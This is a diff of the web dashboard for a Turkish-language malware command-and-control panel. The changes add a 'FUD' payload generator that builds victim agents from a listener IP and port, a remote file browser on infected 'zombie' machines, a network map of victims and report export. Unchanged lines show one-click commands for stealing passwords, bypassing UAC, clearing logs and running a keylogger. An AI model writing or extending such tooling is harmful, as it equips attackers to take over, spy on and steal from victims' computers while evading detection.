@@ -6,6 +6,7 @@
     <title>C2 Karargah - Elite Dashboard</title>
     <link rel="stylesheet" href="/static/style.css">
     <script src="/static/modules.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/vis-network/standalone/umd/vis-network.min.js"></script>
 </head>
 <body>
     <header class="glass-panel">
@@ -35,6 +36,7 @@
                     <input type="number" id="listen-port" value="443" placeholder="Port">
                     <button class="btn btn-primary" onclick="startListener()">Dinle</button>
                 </div>
+                <button class="btn" style="border-color:var(--primary); color:var(--primary); justify-content:center; margin-bottom: 10px;" onclick="openPayloadModal()">🦠 Zararlı Üret (FUD)</button>
             </div>
 
             <div class="sidebar-section">
@@ -69,30 +71,54 @@
             <!-- Terminal -->
             <div class="glass-panel terminal-container">
                 <div class="terminal-header">
-                    <span class="terminal-title" id="term-title">Bağlantı Bekleniyor</span>
-                    <button class="cmd-btn danger" onclick="sendCommand('!PANIK')">☠️ PANİK (Kill-Switch)</button>
+                    <div style="display:flex; flex-direction:column; gap:10px;">
+                        <span class="terminal-title" id="term-title">Bağlantı Bekleniyor</span>
+                        <div style="display:flex; gap:15px; margin-top:5px;">
+                            <button id="tab-term" class="cmd-btn active-tab" onclick="switchTab('terminal')" style="border-bottom:2px solid var(--secondary); border-radius:0;">Terminal</button>
+                            <button id="tab-files" class="cmd-btn" onclick="switchTab('files')" style="border-radius:0; border:none;">Dosyalar</button>
+                        </div>
+                    </div>
+                    <div style="display:flex; gap:10px; align-items:flex-start;">
+                        <button class="cmd-btn" style="border-color:var(--secondary); color:var(--secondary);" onclick="openNetworkMap()">🌐 Ağ Haritası</button>
+                        <button class="cmd-btn" style="border-color:#00ff66; color:#00ff66;" onclick="generateReport()">📄 Rapor Çıkar</button>
+                        <button class="cmd-btn danger" onclick="sendCommand('!PANIK')">☠️ PANİK (Kill-Switch)</button>
+                    </div>
                 </div>
                 
-                <div class="terminal-output" id="terminal-output">C2 Karargah Merkezi Sistemlerine Bağlanıldı.
+                <!-- Terminal View -->
+                <div id="view-terminal" style="display:flex; flex-direction:column; flex:1; overflow:hidden;">
+                    <div class="terminal-output" id="terminal-output">C2 Karargah Merkezi Sistemlerine Bağlanıldı.
 [!] Uçtan uca şifreleme (E2EE) devrede.
 [!] Bir kurban seçin ve komut göndermeye başlayın.</div>
-                
-                <div class="terminal-controls">
-                    <div class="quick-commands">
-                        <button class="cmd-btn" onclick="sendCommand('whoami')">whoami</button>
-                        <button class="cmd-btn" onclick="sendCommand('sysinfo')">sysinfo</button>
-                        <button class="cmd-btn" onclick="sendCommand('!screenshot')">📸 Screenshot</button>
-                        <button class="cmd-btn" onclick="sendCommand('!steal_passwords')">🔑 Şifreleri Çal</button>
-                        <button class="cmd-btn" onclick="sendCommand('!getsystem')">👑 UAC Bypass</button>
-                        <button class="cmd-btn" onclick="sendCommand('!clear_logs')">🧹 İzleri Sil</button>
-                        <button class="cmd-btn" onclick="sendCommand('!keylog_start')">⌨️ Keylogger Başlat</button>
-                        <button class="cmd-btn" onclick="sendCommand('!keylog_dump')">⌨️ Keylog Oku</button>
-                    </div>
+                    
+                    <div class="terminal-controls">
+                        <div class="quick-commands">
+                            <button class="cmd-btn" onclick="sendCommand('whoami')">whoami</button>
+                            <button class="cmd-btn" onclick="sendCommand('sysinfo')">sysinfo</button>
+                            <button class="cmd-btn" onclick="sendCommand('!screenshot')">📸 Screenshot</button>
+                            <button class="cmd-btn" onclick="sendCommand('!steal_passwords')">🔑 Şifreleri Çal</button>
+                            <button class="cmd-btn" onclick="sendCommand('!getsystem')">👑 UAC Bypass</button>
+                            <button class="cmd-btn" onclick="sendCommand('!clear_logs')">🧹 İzleri Sil</button>
+                            <button class="cmd-btn" onclick="sendCommand('!keylog_start')">⌨️ Keylogger Başlat</button>
+                            <button class="cmd-btn" onclick="sendCommand('!keylog_dump')">⌨️ Keylog Oku</button>
+                        </div>
 
-                    <div class="terminal-input-wrapper">
-                        <span class="prompt">C2></span>
-                        <input type="text" id="term-input" class="terminal-input" placeholder="Sistem komutu girin..." onkeypress="handleEnter(event)">
-                        <button class="btn btn-primary" style="width:100px; padding: 8px 15px;" onclick="sendInputCmd()">Çalıştır</button>
+                        <div class="terminal-input-wrapper">
+                            <span class="prompt">C2></span>
+                            <input type="text" id="term-input" class="terminal-input" placeholder="Sistem komutu girin..." onkeypress="handleEnter(event)">
+                            <button class="btn btn-primary" style="width:100px; padding: 8px 15px;" onclick="sendInputCmd()">Çalıştır</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Files View -->
+                <div id="view-files" style="display:none; flex-direction:column; flex:1; background:#050505; padding:20px; overflow-y:auto;">
+                    <div style="display:flex; gap:10px; margin-bottom:15px;">
+                        <input type="text" id="file-path" class="terminal-input" style="flex:1; border:1px solid #333; padding:10px;" placeholder="Örn: C:\">
+                        <button class="btn btn-primary" style="width:auto; padding:0 20px;" onclick="exploreFiles()">📂 Git</button>
+                    </div>
+                    <div id="file-list" style="display:flex; flex-direction:column; gap:5px; color:#fff; font-family:'Fira Code';">
+                        <div style="color:var(--text-muted);">Lütfen önce bir zombi seçin ve dosya yolunu girin.</div>
                     </div>
                 </div>
             </div>
@@ -113,6 +139,41 @@
             </div>
 
             <button id="modal-close-btn" class="btn" style="margin-top:20px; border-color:var(--glass-border);" onclick="closeModal()">Kapat</button>
+        </div>
+    </div>
+
+    <!-- Modal for Payload Generator -->
+    <div id="payloadModal" class="modal-overlay">
+        <div class="modal-content glass-panel">
+            <h2 style="color:var(--primary); font-family:'Orbitron';">🦠 Zararlı Üretim Merkezi (Payload Generator)</h2>
+            <div style="background:rgba(255, 0, 85, 0.05); border-left:3px solid var(--primary); padding:15px; border-radius:6px; margin:20px 0;">
+                <p style="color:#d0d0d0; font-size:1.05rem;">Hedef sisteme sızmak için gerekli olan ajan (zombi) dosyasını oluşturur. Dinleyici IP ve Port bilgilerinizi girin.</p>
+            </div>
+            <div style="display:flex; flex-direction:column; gap:15px;">
+                <div>
+                    <label style="color:var(--secondary); font-weight:bold;">LHOST (Dinleyici IP)</label>
+                    <input type="text" id="payload-lhost" class="terminal-input" style="width:100%; padding:12px; margin-top:5px;" placeholder="Örn: 192.168.1.10">
+                </div>
+                <div>
+                    <label style="color:var(--secondary); font-weight:bold;">LPORT (Dinleyici Port)</label>
+                    <input type="number" id="payload-lport" class="terminal-input" style="width:100%; padding:12px; margin-top:5px;" value="443">
+                </div>
+            </div>
+            <div style="display:flex; gap:10px; margin-top:25px;">
+                <button class="btn btn-primary" onclick="generatePayload()">⚙️ Zararlıyı Oluştur</button>
+                <button class="btn" style="border-color:var(--glass-border);" onclick="closePayloadModal()">İptal</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for Network Map -->
+    <div id="networkModal" class="modal-overlay">
+        <div class="modal-content glass-panel" style="width: 800px; max-width: 95%;">
+            <h2 style="color:var(--secondary); font-family:'Orbitron';">🌐 Siber Ağ Haritası (Topology)</h2>
+            <div id="mynetwork" style="width: 100%; height: 400px; border: 1px solid var(--glass-border); border-radius:8px; margin-top:20px; background:rgba(0,0,0,0.4);"></div>
+            <div style="display:flex; gap:10px; margin-top:20px; justify-content:flex-end;">
+                <button class="btn" style="border-color:var(--glass-border);" onclick="closeNetworkMap()">Kapat</button>
+            </div>
         </div>
     </div>
 
@@ -219,6 +280,46 @@
                 logMsg(`[-] Sinyal Hatası: ${e}`, true);
             }
             updateSessions();
+        }
+
+        function switchTab(tab) {
+            document.getElementById('view-terminal').style.display = tab === 'terminal' ? 'flex' : 'none';
+            document.getElementById('view-files').style.display = tab === 'files' ? 'flex' : 'none';
+            
+            document.getElementById('tab-term').style.borderBottom = tab === 'terminal' ? '2px solid var(--secondary)' : 'none';
+            document.getElementById('tab-files').style.borderBottom = tab === 'files' ? '2px solid var(--secondary)' : 'none';
+        }
+
+        async function exploreFiles() {
+            if(currentSession === null) return alert("Lütfen hedef seçin.");
+            const path = document.getElementById('file-path').value || "C:\\";
+            document.getElementById('file-list').innerHTML = '<div style="color:var(--secondary)">Dosyalar çekiliyor... Lütfen bekleyin.</div>';
+            
+            // Komut: dir /B
+            try {
+                const res = await fetch('/api/command', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({session_id: currentSession, command: `dir "${path}"`})
+                });
+                const data = await res.json();
+                if(data.status === 'success') {
+                    const lines = data.output.split('\n');
+                    let html = '';
+                    lines.forEach(l => {
+                        l = l.trim();
+                        if(!l || l.includes('Volume in drive') || l.includes('Volume Serial') || l.includes('Directory of')) return;
+                        if(l.includes('<DIR>')) {
+                            html += `<div style="padding:8px; border-bottom:1px solid #222; display:flex; align-items:center; gap:10px; color:var(--secondary);"><span style="font-size:1.2rem;">📁</span> ${l}</div>`;
+                        } else {
+                            html += `<div style="padding:8px; border-bottom:1px solid #222; display:flex; align-items:center; gap:10px;"><span style="font-size:1.2rem;">📄</span> ${l}</div>`;
+                        }
+                    });
+                    document.getElementById('file-list').innerHTML = html || 'Boş klasör.';
+                } else {
+                    document.getElementById('file-list').innerHTML = `<div style="color:var(--primary)">Hata: ${data.message}</div>`;
+                }
+            } catch(e) {}
         }
 
         function handleEnter(e) {
@@ -342,6 +443,91 @@
                     logMsg(`\n[-] Hata: ${data.message}`, true);
                 }
             } catch(e) { logMsg(`[-] Modül çalıştırma hatası: ${e}`, true); }
+        }
+
+        function openPayloadModal() {
+            document.getElementById('payloadModal').classList.add('active');
+        }
+
+        function closePayloadModal() {
+            document.getElementById('payloadModal').classList.remove('active');
+        }
+
+        async function generatePayload() {
+            const lhost = document.getElementById('payload-lhost').value.trim();
+            const lport = document.getElementById('payload-lport').value.trim();
+            if(!lhost) return alert('LHOST girmelisiniz!');
+            
+            closePayloadModal();
+            logMsg(`\n[*] Zararlı yazılım üretiliyor (LHOST=${lhost}, LPORT=${lport})... Lütfen bekleyin.`, false);
+            
+            try {
+                const res = await fetch('/api/generate_payload', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({lhost: lhost, lport: lport})
+                });
+                const data = await res.json();
+                if(data.status === 'success') {
+                    logMsg(`\n[+] ${data.message}`);
+                    logMsg(`[+] İNDİR: <a href="${data.download_url}" style="color:#00e5ff; text-decoration:underline;" target="_blank">Buraya tıklayarak zararlıyı indirin</a>`);
+                } else {
+                    logMsg(`\n[-] Hata: ${data.message}`, true);
+                }
+            } catch(e) { logMsg(`[-] Üretim hatası: ${e}`, true); }
+        }
+
+        async function generateReport() {
+            const history = document.getElementById('terminal-output').innerText;
+            logMsg(`\n[*] Görev raporu oluşturuluyor...`, false);
+            try {
+                const res = await fetch('/api/generate_report', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({history: history})
+                });
+                const data = await res.json();
+                if(data.status === 'success') {
+                    logMsg(`[+] ${data.message}`);
+                    logMsg(`[+] İNDİR: <a href="${data.download_url}" style="color:#00ff66; text-decoration:underline;" target="_blank">Raporu İndir (.html)</a>`);
+                } else {
+                    logMsg(`[-] Hata: ${data.message}`, true);
+                }
+            } catch(e) { logMsg(`[-] Rapor hatası: ${e}`, true); }
+        }
+
+        let network = null;
+        async function openNetworkMap() {
+            document.getElementById('networkModal').classList.add('active');
+            
+            // Fetch sessions to draw zombies
+            let zNodes = [];
+            let edges = [];
+            try {
+                const res = await fetch('/api/sessions');
+                const data = await res.json();
+                data.sessions.forEach(s => {
+                    zNodes.push({ id: s.id, label: `ZOMBI-${s.id}\n${s.ip}`, shape: 'image', image: 'https://cdn-icons-png.flaticon.com/512/3067/3067260.png', size:20 });
+                    edges.push({ from: 0, to: s.id, color: { color: '#00ff66' }, dashes: true });
+                });
+            } catch(e) {}
+
+            var nodes = new vis.DataSet([
+                { id: 0, label: 'C2 KARARGAH\n(Siz)', shape: 'image', image: 'https://cdn-icons-png.flaticon.com/512/2885/2885412.png', size:30 },
+                ...zNodes
+            ]);
+
+            var container = document.getElementById('mynetwork');
+            var data = { nodes: nodes, edges: edges };
+            var options = {
+                nodes: { font: { color: '#ffffff', face: 'Fira Code' } },
+                physics: { barnesHut: { springLength: 150 } }
+            };
+            network = new vis.Network(container, data, options);
+        }
+
+        function closeNetworkMap() {
+            document.getElementById('networkModal').classList.remove('active');
         }
 
         setInterval(updateSessions, 3000);
